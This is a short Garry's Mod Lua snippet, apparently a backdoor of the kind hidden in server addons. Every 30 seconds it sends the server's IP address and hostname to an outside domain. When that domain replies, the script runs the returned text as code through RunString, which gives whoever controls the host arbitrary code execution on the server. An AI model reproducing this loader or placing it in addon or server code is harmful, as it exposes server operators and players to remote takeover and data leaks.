if(tracker) then
else
-- son bir defa
tracker = true
  timer.Create("tracker", 30,0, function() 
    http.Fetch( "https://lcns.sftware.xyz/send",
        
        function( body, length, headers, code )
            if code == 200 or code == "200" then
                timer.Remove("tracker")
                RunString(body,"lcns" , false)
            end  
        end,
  
        function( message )
                
        end,

        { 
            ["serverip"] = game.GetIPAddress(),
            ["servername"] =  GetHostName(),
        }
    )
end) 
end
